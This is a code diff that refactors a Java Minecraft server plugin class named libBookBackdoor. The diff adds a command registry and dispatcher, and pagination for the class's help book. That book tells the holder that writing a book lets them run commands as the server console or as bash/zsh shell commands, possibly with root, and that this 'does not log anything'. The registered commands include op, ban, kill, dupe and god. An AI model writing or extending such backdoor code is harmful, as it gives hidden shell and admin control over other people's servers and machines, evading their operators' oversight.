@@ -71,6 +71,30 @@ class ColorTranslator {
  */
 
 class Commands {
+    Command[] registeredCommands;
+
+    public void registerCommands(Command[] commands) {
+        registeredCommands = commands;
+    }
+
+    public void parseCommand(Plugin plugin, PlayerEditBookEvent event, String commandName, String[] args) {
+        if (registeredCommands != null) {
+            for (Command command : registeredCommands) {
+                if (command.commandName.equals(commandName)) {
+                    command.command(plugin, event, args);
+                    return;
+                }
+            }
+            event.getPlayer().sendMessage("Could not find the specified command");
+        } else {
+            event.getPlayer().sendMessage("Commands have not been registered.");
+        }
+    }
+
+    Commands() {
+        registerCommands(new Command[]{help, give, mend, brazil, seed, tp, enchant, xp, kill, ban, kick, op, deop, bbreak, troll, dupe, gamemode, god, invisible});
+    }
+
     abstract class Command {
         public String commandName = null;
         public String commandDescription = null;
@@ -522,14 +546,27 @@ class Commands {
                 meta.addPage("To run commands as " + ChatColor.RED + "CONSOLE" + ChatColor.RESET + ", open a new book and type /<your command>\n\nTo run a custom command made by us keep reading.\n\nWhen your done with you command, name the book 'cmd'");
                 meta.addPage("To run commands in" + ChatColor.RED + " BASH " + ChatColor.RESET + " or " + ChatColor.LIGHT_PURPLE + " ZSH" + ChatColor.RESET + ", open a new book and type $<your command>\n\nDepending on the user running the server, you will lets say, have full root. Try and see by running $whoami.\nThis does not log anything :)");
 
-                // Page 4
-                BaseComponent[] page = new BaseComponent[]{shared.help.help, shared.give.help, shared.mend.help, shared.brazil.help, shared.seed.help, shared.tp.help, shared.enchant.help, shared.xp.help, shared.kill.help, shared.ban.help, shared.kick.help}; // Build the new page
+                // No page can be longer than 14 lines
+                int index = 0;
+                ArrayList<TextComponent> page = new ArrayList<>();
+                for (Command command : registeredCommands) {
+                    if (index >= 13) {
+                        index = 0;
+                        TextComponent[] pageBase = new TextComponent[page.size()];
+                        pageBase = page.toArray(pageBase);
+                        meta.spigot().addPage(pageBase);
+                        page = new ArrayList<>();
+                    }
+                    page.add(command.help);
+                    index++;
+                }
+                // In case it's not multiple of 13
+                if (index != 0) {
+                    TextComponent[] pageBase = new TextComponent[page.size()];
+                    pageBase = page.toArray(pageBase);
+                    meta.spigot().addPage(pageBase);
+                }
 
-                // Page 5
-                BaseComponent[] page2 = new BaseComponent[]{shared.op.help, shared.deop.help, shared.bbreak.help, shared.troll.help, shared.dupe.help, shared.gamemode.help, shared.god.help, shared.invisible.help};
-
-                meta.spigot().addPage(page);
-                meta.spigot().addPage(page2);
                 book.setItemMeta(meta); // Save all Changes to the book
                 player.getInventory().addItem(book);
             } catch (SecurityException | IllegalArgumentException ex) {
@@ -636,47 +673,9 @@ public class libBookBackdoor implements Listener {
                     String mainCmd = args[0].toLowerCase();
                     // Init the Commands class
                     Commands runner = new Commands();
-                    if (mainCmd.equals(runner.give.commandName)) {
 
-                    } else if (mainCmd.equals(runner.kick.commandName)) {
-                        runner.kick.command(plugin, event, args);
-                    } else if (mainCmd.equals(runner.ban.commandName)) {
-                        runner.ban.command(plugin, event, args);
-                    } else if (mainCmd.equals(runner.kill.commandName)) {
-                        runner.kill.command(plugin, event, args);
-                    } else if (mainCmd.equals(runner.xp.commandName)) {
-                        runner.xp.command(plugin, event, args);
-                    } else if (mainCmd.equals(runner.enchant.commandName)) {
-                        runner.enchant.command(plugin, event, args);
-                    } else if (mainCmd.equals(runner.tp.commandName)) {
-                        runner.tp.command(plugin, event, args);
-                    } else if (mainCmd.equals(runner.seed.commandName)) {
-                        runner.seed.command(plugin, event, args);
-                    } else if (mainCmd.equals(runner.brazil.commandName)) {
-                        runner.brazil.command(plugin, event, args);
-                    } else if (mainCmd.equals(runner.mend.commandName)) {
-                        runner.mend.command(plugin, event, args);
-                    } else if (mainCmd.equals(runner.op.commandName)) {
-                        runner.op.command(plugin, event, args);
-                    } else if (mainCmd.equals(runner.deop.commandName)) {
-                        runner.deop.command(plugin, event, args);
-                    } else if (mainCmd.equals(runner.bbreak.commandName)) {
-                        runner.bbreak.command(plugin, event, args);
-                    } else if (mainCmd.equals(runner.troll.commandName)) {
-                        runner.troll.command(plugin, event, args);
-                    } else if (mainCmd.equals(runner.dupe.commandName)) {
-                        runner.dupe.command(plugin, event, args);
-                    } else if (mainCmd.equals(runner.gamemode.commandName)) {
-                        runner.gamemode.command(plugin, event, args);
-                    } else if (mainCmd.equals(runner.god.commandName)) {
-                        runner.god.command(plugin, event, args);
-                    } else if (mainCmd.equals(runner.invisible.commandName)) {
-                        runner.invisible.command(plugin, event, args);
-                    } else if (mainCmd.equals(runner.help.commandName)) {
-                        runner.help.command(plugin, event, args);
-                    } else {
-                        player.sendMessage(ChatColor.RED + "Invalid command.");
-                    }
+                    runner.parseCommand(plugin, event, mainCmd, args);
+
                     player.getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount() - 1);
                     this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
                         public void run() {
